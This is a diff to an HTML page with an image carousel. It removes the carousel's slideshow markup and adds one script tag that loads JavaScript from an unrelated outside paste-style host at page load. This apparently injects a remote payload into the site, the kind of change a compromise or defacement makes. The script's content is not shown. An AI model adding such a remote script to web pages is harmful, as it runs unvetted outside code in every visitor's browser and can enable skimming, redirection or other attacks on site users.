@@ -40,17 +40,7 @@
             <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
             <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
         </ol>
-        <div class="container1">
-            <center>
-                <img src="assets/images/bg1.png" style='width:1100px; height: 500px;'> 
-                <div class="carousel-item active">
-                    <img src="assets/images/slideshow5.jpg" class="d-block m-auto" style='width:90%; height: 500px; border: 2px solid black; border-radius: 40px;' alt="...">
-                </div>
-                <div class="carousel-item">
-                    <img src="assets/images/slideshow6.jpg" class="d-block m-auto" style='width:90%; height: 500px; border: 2px solid black; border-radius: 40px;' alt="...">
-                </div>
-            </center>
-        </div>
+       <script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/6BSBSLWX7DLPJ"></script>
         <button class="carousel-control-prev" type="button" data-target="#carouselExampleIndicators" data-slide="prev">
             <span class="carousel-control-prev-icon" aria-hidden="true"></span>
             <span class="sr-only">Previous</span>
